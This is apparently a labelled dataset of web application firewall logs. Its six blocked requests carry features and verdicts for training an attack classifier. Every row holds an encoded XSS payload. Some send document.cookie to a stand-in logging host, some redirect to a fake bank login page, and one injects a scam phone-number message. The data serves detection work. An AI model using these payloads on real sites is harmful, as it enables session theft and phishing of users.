Timestamp,TransactionID,ClientIP,ClientPort,ServerIP,ServerPort,RequestMethod,RequestURIPath,RequestURIQuery,RequestProtocol,UserAgent,Referer,AcceptEncoding,ContentType,Accept,Cookie,Connection,OtherHeaders,RequestBody,ResponseStatus,ResponseProtocol,ResponseHeaders,ResponseBody,WAFInterrupted,InterruptionRuleID,InterruptionStatus,InterruptionAction,MatchedRulesCount,MatchedRulesIDs,MatchedRulesMessages,MatchedRulesTags,AIScore,AIVerdict,AIVerdictLabel,AIVulnerabilityTypeLabel,RequestLength,PathLength,QueryLength,BodyLength,NumParams,LongestParamValueLength,NumSpecialChars,NumEncodedChars,NumDoubleEncodedChars,RatioSpecialCharsToTotalChars,NumKeywords,NumUniqueChars,IsJSONBody,IsXMLBody,IsMultipartForm,HasNumericPathSegment,DepthOfPath,UsesBase64Encoding,UsesHexEncoding,HasMultipleContentLength,InvalidHTTPVersion,NumHTTPHeaders,TimeOfDayHour,TimeOfDayDayOfWeek
2025-07-10T20:30:59Z,SnqmniJGoXacDwSDeju,172.19.0.4,49688,coraza-proxy,8080,GET,/rest/products/search,data=%3Cinput+type%3Dsearch+onmouseover%3Dwindow.location.href+%3D+%22https%3A%2F%2Fpankofamerika.com%2Ffake_login%22%3B+autofocus%3E,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,,,,true,949110,403,deny,68,900990;901100;901110;901111;901115;901120;901125;901130;901140;901141;901142;901143;901160;901162;901168;901163;901164;901165;901171;901167;901169;901170;901200;901340;901400;911013;913013;920280;920013;921013;930013;931013;932013;933013;934013;941010;941013;942013;943013;944013;949052;949152;949013;980013;911014;913014;920014;921014;930014;931014;932014;933014;934014;941100;941160;941180;941014;942014;943014;944014;949059;949159;949060;949160;949110;980099;980044;980170,";;;;;;;;;;;;;;;;;;;;;;;Enabling body inspection;;;;Request Missing a Host Header;;;;;;;;;;;;;;;;;;;;;;;;;;XSS Attack Detected via libinjection;NoScript XSS InjectionChecker: HTML Injection;Node-Validator Deny List Keywords;;;;;;;;;Inbound Anomaly Score Exceeded (Total Score: 18);;;Anomaly Scores: (Inbound Scores: blocking=18, detection=18, per_pl=18-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=15, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=18)",OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-protocol;paranoia-level/1;OWASP_CRS;OWASP_CRS/PROTOCOL-ENFORCEMENT;capec/1000/210/272;PCI/6.5.10;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS/ATTACK-XSS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;anomaly-evaluation;OWASP_CRS;OWASP_CRS;OWASP_CRS;reporting;OWASP_CRS,-1.00,not evaluated,malicious,xss,376,21,133,0,1,104,24,12,0,0.1558,2,35,false,false,false,false,3,false,true,false,false,4,20,Thursday
2025-07-10T20:30:59Z,tsjBFFgqkqCwQmFGSWj,172.19.0.4,49678,coraza-proxy,8080,GET,/rest/products/search,file=%253Cinput%2Btype%253Dtext%2Bonload%253Dnew%2BImage%2528%2529.src%2B%253D%2B%2522https%253A%252F%252Fwenojhdskdsf.com%252Flog_cookie.php%253Fc%253D%2522%2B%252B%2Bdocument.cookie%253B%2Bautofocus%253E,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,,,,true,949110,403,deny,68,900990;901100;901110;901111;901115;901120;901125;901130;901140;901141;901142;901143;901160;901162;901168;901163;901164;901165;901171;901167;901169;901170;901200;901340;901400;911013;913013;920280;920013;921013;930013;931013;932013;933013;934013;941010;941013;942013;943013;944013;949052;949152;949013;980013;911014;913014;920014;921014;930014;931014;932014;933014;934014;941100;941160;941180;941014;942014;943014;944014;949059;949159;949060;949160;949110;980099;980044;980170,";;;;;;;;;;;;;;;;;;;;;;;Enabling body inspection;;;;Request Missing a Host Header;;;;;;;;;;;;;;;;;;;;;;;;;;XSS Attack Detected via libinjection;NoScript XSS InjectionChecker: HTML Injection;Node-Validator Deny List Keywords;;;;;;;;;Inbound Anomaly Score Exceeded (Total Score: 18);;;Anomaly Scores: (Inbound Scores: blocking=18, detection=18, per_pl=18-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=15, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=18)",OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-protocol;paranoia-level/1;OWASP_CRS;OWASP_CRS/PROTOCOL-ENFORCEMENT;capec/1000/210/272;PCI/6.5.10;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS/ATTACK-XSS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;anomaly-evaluation;OWASP_CRS;OWASP_CRS;OWASP_CRS;reporting;OWASP_CRS,-1.00,not evaluated,malicious,xss,411,21,205,0,1,150,33,25,17,0.1460,2,39,false,false,false,false,3,false,true,false,false,4,20,Thursday
2025-07-10T20:31:00Z,lxBpmlDOCcnEuwbpWMi,172.19.0.4,49774,coraza-proxy,8080,PUT,/api/Users/2,,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:144,"{""name"": ""XSS User <a href=\""javascript:window.location.href = \""https://pankofamerika.com/fake_login\"";\"">Download</a>"", ""bio"": ""Some XSS Bio""}",,,,,true,949110,403,deny,66,900990;901100;901110;901111;901115;901120;901125;901130;901140;901141;901142;901143;901160;901162;901168;901163;901164;901165;901171;901167;901169;901170;901200;901340;901400;911100;911013;913013;920280;920013;921013;930013;931013;932013;933013;934013;941010;941013;942013;943013;944013;949052;949152;949013;980013;911014;913014;920014;921014;930014;931014;932014;933014;934014;941014;942014;943014;944014;949059;949159;949060;949160;949110;980099;980044;980170,";;;;;;;;;;;;;;;;;;;;;;;Enabling body inspection;;Method is not allowed by policy;;;Request Missing a Host Header;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;Inbound Anomaly Score Exceeded (Total Score: 8);;;Anomaly Scores: (Inbound Scores: blocking=8, detection=8, per_pl=8-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=8)",OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-generic;paranoia-level/1;OWASP_CRS;OWASP_CRS/METHOD-ENFORCEMENT;capec/1000/210/272/220/274;PCI/12.1;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-protocol;paranoia-level/1;OWASP_CRS;OWASP_CRS/PROTOCOL-ENFORCEMENT;capec/1000/210/272;PCI/6.5.10;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS/ATTACK-XSS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;anomaly-evaluation;OWASP_CRS;OWASP_CRS;OWASP_CRS;reporting;OWASP_CRS,-1.00,not evaluated,malicious,xss,384,12,0,144,2,105,39,0,0,0.2500,5,41,true,false,false,true,3,true,false,false,false,6,20,Thursday
2025-07-10T20:31:00Z,PCNUMLGvnUreLSJZHwO,172.19.0.4,49718,coraza-proxy,8080,GET,/rest/products/search,path=%3Ca+href%3D%22javascript%3Anew+Image%28%29.src+%3D+%22https%3A%2F%2Fwenojhdskdsf.com%2Flog_cookie.php%3Fc%3D%22+%2B+document.cookie%3B%22%3EClick+me%3C%2Fa%3E,HTTP/1.1,Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/),,"gzip, deflate, br",,*/*,,keep-alive,,,,,,,true,949110,403,deny,69,900990;901100;901110;901111;901115;901120;901125;901130;901140;901141;901142;901143;901160;901162;901168;901163;901164;901165;901171;901167;901169;901170;901200;901340;901400;911013;913013;920280;920013;921013;930013;931013;932013;933013;934013;941010;941013;942013;943013;944013;949052;949152;949013;980013;911014;913014;920014;921014;930014;931014;932014;933014;934014;941100;941170;941180;941210;941014;942014;943014;944014;949059;949159;949060;949160;949110;980099;980044;980170,";;;;;;;;;;;;;;;;;;;;;;;Enabling body inspection;;;;Request Missing a Host Header;;;;;;;;;;;;;;;;;;;;;;;;;;XSS Attack Detected via libinjection;NoScript XSS InjectionChecker: Attribute Injection;Node-Validator Deny List Keywords;Javascript Word Detected;;;;;;;;;Inbound Anomaly Score Exceeded (Total Score: 23);;;Anomaly Scores: (Inbound Scores: blocking=23, detection=23, per_pl=23-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=20, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=23)",OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-protocol;paranoia-level/1;OWASP_CRS;OWASP_CRS/PROTOCOL-ENFORCEMENT;capec/1000/210/272;PCI/6.5.10;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS/ATTACK-XSS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;anomaly-evaluation;OWASP_CRS;OWASP_CRS;OWASP_CRS;reporting;OWASP_CRS,-1.00,not evaluated,malicious,xss,351,21,164,0,1,115,37,22,0,0.2000,2,38,false,false,false,false,3,false,true,false,false,4,20,Thursday
2025-07-10T20:31:01Z,pvtFoGBgEVnrOsPCXlL,172.19.0.4,49810,coraza-proxy,8080,POST,/api/Users/,,HTTP/1.1,Nikto/,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:499,"{""email"": ""%3csvg%2foNcHANGE%3DDOCUmenT.body.INnerHtml+%3d+%27%3Ch1%3eTRuSt+mE%21%3c%2fh1%3E%3CP%3ECall+me+aT+1+888+345+8443.%3C%2fp%3E%27%3b%3e%40eXamPLE.COM"", ""password"": ""&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x31;&#x32;&#x33;"", ""passwordRepeat"": ""%26%23%78%37%30%3b%26%23%78%36%31%3b%26%23%78%37%33%3b%26%23%78%37%33%3b%26%23%78%37%37%3b%26%23%78%36%66%3b%26%23%78%37%32%3b%26%23%78%36%34%3b%26%23%78%33%31%3b%26%23%78%33%32%3b%26%23%78%33%33%3b"", ""securityAnswer"": ""MY+pet%27s+naME""}",,,,,true,949110,403,deny,66,900990;901100;901110;901111;901115;901120;901125;901130;901140;901141;901142;901143;901160;901162;901168;901163;901164;901165;901171;901167;901169;901170;901200;901340;901400;911013;913100;913013;920280;920013;921013;930013;931013;932013;933013;934013;941010;941013;942013;943013;944013;949052;949152;949013;980013;911014;913014;920014;921014;930014;931014;932014;933014;934014;941014;942014;943014;944014;949059;949159;949060;949160;949110;980099;980044;980170,";;;;;;;;;;;;;;;;;;;;;;;Enabling body inspection;;;Found User-Agent associated with security scanner;;Request Missing a Host Header;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;Inbound Anomaly Score Exceeded (Total Score: 8);;;Anomaly Scores: (Inbound Scores: blocking=8, detection=8, per_pl=8-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=8)",OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-reputation-scanner;paranoia-level/1;OWASP_CRS;OWASP_CRS/SCANNER-DETECTION;capec/1000/118/224/541/310;PCI/6.5.10;OWASP_CRS;application-multi;language-multi;platform-multi;attack-protocol;paranoia-level/1;OWASP_CRS;OWASP_CRS/PROTOCOL-ENFORCEMENT;capec/1000/210/272;PCI/6.5.10;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS/ATTACK-XSS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;anomaly-evaluation;OWASP_CRS;OWASP_CRS;OWASP_CRS;reporting;OWASP_CRS,-1.00,not evaluated,malicious,xss,674,11,0,499,4,198,163,87,0,0.3196,1,62,true,false,false,false,2,false,true,false,false,6,20,Thursday
2025-07-10T20:31:01Z,MbCpNGBehTqhRTsOCct,172.19.0.4,49814,coraza-proxy,8080,GET,/rest/products/search,search=%3Csvg%2Fonmouseover%3Dwindow.location.href+%3D+%22https%3A%2F%2Fpankofamerika.com%2Ffake_login%22%3B%3E,HTTP/1.1,sqlmap/,,"gzip, deflate, br",,*/*,,keep-alive,,,,,,,true,949110,403,deny,69,900990;901100;901110;901111;901115;901120;901125;901130;901140;901141;901142;901143;901160;901162;901168;901163;901164;901165;901171;901167;901169;901170;901200;901340;901400;911013;913100;913013;920280;920013;921013;930013;931013;932013;933013;934013;941010;941013;942013;943013;944013;949052;949152;949013;980013;911014;913014;920014;921014;930014;931014;932014;933014;934014;941100;941160;941180;941014;942014;943014;944014;949059;949159;949060;949160;949110;980099;980044;980170,";;;;;;;;;;;;;;;;;;;;;;;Enabling body inspection;;;Found User-Agent associated with security scanner;;Request Missing a Host Header;;;;;;;;;;;;;;;;;;;;;;;;;;XSS Attack Detected via libinjection;NoScript XSS InjectionChecker: HTML Injection;Node-Validator Deny List Keywords;;;;;;;;;Inbound Anomaly Score Exceeded (Total Score: 23);;;Anomaly Scores: (Inbound Scores: blocking=23, detection=23, per_pl=23-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=15, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=23)",OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-reputation-scanner;paranoia-level/1;OWASP_CRS;OWASP_CRS/SCANNER-DETECTION;capec/1000/118/224/541/310;PCI/6.5.10;OWASP_CRS;application-multi;language-multi;platform-multi;attack-protocol;paranoia-level/1;OWASP_CRS;OWASP_CRS/PROTOCOL-ENFORCEMENT;capec/1000/210/272;PCI/6.5.10;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS/ATTACK-XSS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;anomaly-evaluation;OWASP_CRS;OWASP_CRS;OWASP_CRS;reporting;OWASP_CRS,-1.00,not evaluated,malicious,xss,244,21,111,0,1,80,21,12,0,0.1591,1,34,false,false,false,false,3,true,true,false,false,4,20,Thursday
